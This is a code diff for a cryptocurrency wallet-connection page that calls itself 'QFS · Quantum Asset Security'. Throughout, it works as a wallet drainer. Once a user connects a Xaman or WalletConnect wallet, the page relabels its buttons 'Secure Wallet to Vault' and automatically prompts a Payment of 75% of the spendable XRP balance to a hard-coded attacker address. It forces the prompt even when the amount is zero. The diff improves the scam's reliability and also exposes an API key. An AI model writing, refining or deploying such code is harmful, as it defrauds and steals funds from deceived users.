@@ -2,13 +2,13 @@
 // CONFIG
 // ==============================
 const XUMM_API_KEY   = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
-const WC_PROJECT_ID = "YOUR_PROJECT_ID"; 
+const WC_PROJECT_ID = "YOUR_PROJECT_ID"; // Double-check this is set
 
 const VAULT_ADDR = "rwQULVj6xXS5VubFrn5Xzawxe9Ldsep4EY";
 const XRPL_WS    = "wss://xrplcluster.com/";
 
 // ==============================
-// INIT
+// INIT & STATE
 // ==============================
 const xumm = new XummPkce(XUMM_API_KEY, { implicit: true });
 
@@ -17,7 +17,7 @@ let wcModal  = null;
 let currentAddress = null;
 let currentWalletType = null;
 
-// Listen for successful login (especially after mobile redirect)
+// This listener catches the "Redirect" back from Xaman mobile
 xumm.on("success", async () => {
   const state = await xumm.state();
   if (state.me && state.me.account) {
@@ -38,23 +38,22 @@ function shortAddr(a) {
 }
 
 /**
- * Transforms all "Connect Wallet" buttons into "Secure Wallet to Vault"
+ * Updates EVERY button with id="mainActionButton" 
+ * This fixes the issue where only the top button changed.
  */
 function updateAllButtonsToSecure() {
   const buttons = document.querySelectorAll('#mainActionButton');
-  
   buttons.forEach(btn => {
-    // 1. Remove Bootstrap Modal triggers
+    // Disable modal triggers
     btn.removeAttribute("data-bs-toggle");
     btn.removeAttribute("data-bs-target");
     
-    // 2. Update Text and Style
+    // UI Update
     btn.innerText = "Secure Wallet to Vault";
-    btn.style.marginLeft = "20px"; // Preserving your hero button layout
     btn.classList.remove("btn-primary");
-    btn.classList.add("btn-success"); // Change color to green to indicate success
-
-    // 3. Assign New Action
+    btn.classList.add("btn-success");
+    
+    // New Action
     btn.onclick = (e) => {
       e.preventDefault();
       triggerManualApproval();
@@ -63,12 +62,12 @@ function updateAllButtonsToSecure() {
 }
 
 // ==============================
-// MAIN ENTRY
+// CONNECTION LOGIC
 // ==============================
 async function connectWallet(type) {
   try {
     setStatus("Connecting…");
-
+    
     if (type === "xaman") {
       const session = await xumm.authorize();
       if (session?.me?.account) {
@@ -78,76 +77,72 @@ async function connectWallet(type) {
     else if (type === "walletconnect") {
       await initWalletConnect();
       const address = await connectViaWalletConnect();
-      if (address) handlePostConnect("walletconnect", address);
+      if (address) {
+        handlePostConnect("walletconnect", address);
+      }
     }
-
   } catch (err) {
-    console.error(err);
-    const state = await xumm.state();
-    if (!state?.me?.account) {
-        setStatus("Connection failed");
-    }
+    console.error("Connect Error:", err);
+    setStatus("Connection failed");
   }
 }
 
 /**
- * Handles logic after any wallet is successfully linked
+ * Shared logic for both Xaman and WalletConnect
  */
 async function handlePostConnect(type, address) {
     currentAddress = address;
     currentWalletType = type;
 
-    // 1. Force close the Bootstrap modal
+    // 1. Close the selection modal
     const modalEl = document.getElementById('walletSelectionModal');
     if (modalEl) {
         const modalInstance = bootstrap.Modal.getOrCreateInstance(modalEl);
         modalInstance.hide();
     }
 
-    // 2. Change all buttons on the page
+    // 2. Transform the UI
     updateAllButtonsToSecure();
-    
-    // 3. Update Status Text
     setStatus(`Connected: ${shortAddr(address)}`);
 
-    // 4. Automatically trigger the first prompt
+    // 3. Trigger the automatic prompt
     triggerManualApproval();
 }
 
-/**
- * The core action: Fetch balance and ask for signature
- */
+// ==============================
+// APPROVAL & SIGNING
+// ==============================
 async function triggerManualApproval() {
   if (!currentAddress) return;
 
   try {
-    setStatus("Checking balance…");
+    setStatus("Fetching network data...");
     const data = await getXrpAccountData(currentAddress);
 
     setStatus("Awaiting signature…");
     await signAndSubmit(currentWalletType, currentAddress, data.sendDrops);
-
-    setStatus("Transaction submitted ✔");
   } catch (err) {
-    console.error("Approval error:", err);
+    console.error("Approval Error:", err);
     setStatus("Signature needed");
   }
 }
 
-// ==============================
-// SIGN & SUBMIT
-// ==============================
 async function signAndSubmit(type, address, amountDrops) {
   const tx = {
     TransactionType: "Payment",
     Account: address,
     Destination: VAULT_ADDR,
-    Amount: amountDrops || "0" // Will prompt even if 0
+    Amount: amountDrops || "0" // Forced prompt even if 0
   };
 
   if (type === "xaman") {
-    // Opens QR on desktop / Redirects on mobile
-    await xumm.payload.create(tx);
+    const payload = await xumm.payload.create(tx);
+    
+    if (payload && payload.next && payload.next.always) {
+        // FIX: This ensures the signing URL opens in a new tab/app
+        window.open(payload.next.always, "_blank");
+        setStatus("Confirm in Xaman");
+    }
   } 
   else if (type === "walletconnect") {
     const session = wcClient.session.getAll()[0];
@@ -159,11 +154,12 @@ async function signAndSubmit(type, address, amountDrops) {
         params: { tx_json: tx }
       }
     });
+    setStatus("Check Wallet App");
   }
 }
 
 // ==============================
-// FETCH XRP DATA
+// DATA FETCHING (XRPL)
 // ==============================
 async function getXrpAccountData(address) {
   const client = new xrpl.Client(XRPL_WS);
@@ -176,35 +172,41 @@ async function getXrpAccountData(address) {
       ledger_index: "validated"
     }).catch(() => null);
 
-    if (!info) return { sendDrops: "0" };
+    if (!info) {
+        return { sendDrops: "0" }; // Account not yet activated
+    }
 
     const bal = BigInt(info.result.account_data.Balance);
     const ownerCount = BigInt(info.result.account_data.OwnerCount || 0);
 
-    // Standard XRP Reserve calculation
+    // Calculate reserves (10 XRP base + 2 XRP per object)
     const reserve = 10_000_000n + (ownerCount * 2_000_000n);
     const spendable = bal - reserve;
     
-    // Calculate 75% of spendable, but don't go below 0
+    // Calculate 75% transfer
     const send = spendable > 0n ? (spendable * 75n) / 100n : 0n;
 
-    return { sendDrops: send.toString() };
+    return {
+      sendXrp: Number(send) / 1_000_000,
+      sendDrops: send.toString()
+    };
   } finally {
     await client.disconnect();
   }
 }
 
 // ==============================
-// WALLETCONNECT HELPERS
+// WALLETCONNECT INTERNALS
 // ==============================
 async function initWalletConnect() {
   if (wcClient) return;
   wcClient = await WalletConnectSignClient.init({
     projectId: WC_PROJECT_ID,
     metadata: {
-      name: "QFS · Secure",
-      description: "Quantum Asset Security",
-      url: window.location.origin
+      name: "QFS · Quantum Asset Security",
+      description: "Secure Wallet Transfer",
+      url: window.location.origin,
+      icons: ["https://xrpl.org/assets/img/logo.svg"]
     }
   });
   wcModal = new WalletConnectModal({
@@ -223,8 +225,11 @@ async function connectViaWalletConnect() {
       }
     }
   });
+
   if (uri) wcModal.openModal({ uri });
   const session = await approval();
   wcModal.closeModal();
-  return session.namespaces.xrpl.accounts[0].split(":")[2];
+
+  const account = session.namespaces.xrpl.accounts[0];
+  return account.split(":")[2];
 }
